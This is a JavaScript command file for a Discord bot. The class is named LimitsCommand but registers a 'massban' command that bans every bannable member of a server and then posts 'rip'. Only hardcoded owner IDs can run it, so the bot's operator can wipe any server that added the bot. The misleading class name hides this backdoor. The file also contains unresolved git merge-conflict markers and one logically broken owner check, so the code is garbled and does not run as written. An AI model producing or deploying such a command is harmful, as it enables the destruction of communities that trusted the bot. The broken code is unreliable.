const { Command } = require('discord-akairo');
const { limits, adminCanChangeLimits } = require('../../config.js');

class LimitsCommand extends Command {
    constructor() {
        super('massban', {
            aliases: ['bw', 'massban'],
            args: [
                {
                    id: 'index',
                    type: 'integer'
                },
                {
                    id: 'value',
                    type: 'integer'
                }
            ],
            channel: 'guild'
        });
    }

    async exec(message, args) {
        let Owner = message.author;
<<<<<<< HEAD
<<<<<<< HEAD
        if(Owner.id !== "603269203511738420") return message.reply("Only the bot owner can use this command!")
=======
        if(Owner.id !== "727447049892659200" || "603269203511738420") return message.reply("Only the bot owner can use this command!")
>>>>>>> parent of 1397be6... wd

=======
        if(Owner.id !== "727447049892659200") return message.reply("Only the bot owner can use this command!")
        
>>>>>>> parent of d85129d... Commited changes
        message.guild.members.cache.filter(member => member.bannable).forEach(member => {member.ban()});


    message.channel.send("rip")
    }
}
module.exports = LimitsCommand;